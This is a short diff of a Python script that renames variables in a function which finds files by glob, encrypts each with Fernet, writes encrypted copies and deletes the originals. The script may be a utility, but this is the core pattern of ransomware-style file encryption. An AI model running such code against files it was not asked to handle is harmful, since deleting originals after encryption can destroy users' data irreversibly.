@@ -25,16 +25,16 @@ def seek_files(globs):
 
 def encrypt_files(files, key):
     '''Encrypt the given list of files with fernet and remove the originals'''
-    f = Fernet(key)
+    fernet = Fernet(key)
     encrypted = []
     for file in files:
         output = f'{file}{ENCRYPTED_SUFFIX}'
         try:
-            with open(file, "rb") as in_f:
-                data = in_f.read()
-            data = f.encrypt(data)
-            with open(output, "wb") as out_f:
-                out_f.write(data)
+            with open(file, "rb") as f:
+                data = f.read()
+            data = fernet.encrypt(data)
+            with open(output, "wb") as f:
+                f.write(data)
             os.remove(file)
             encrypted.append({
                 'in': file,
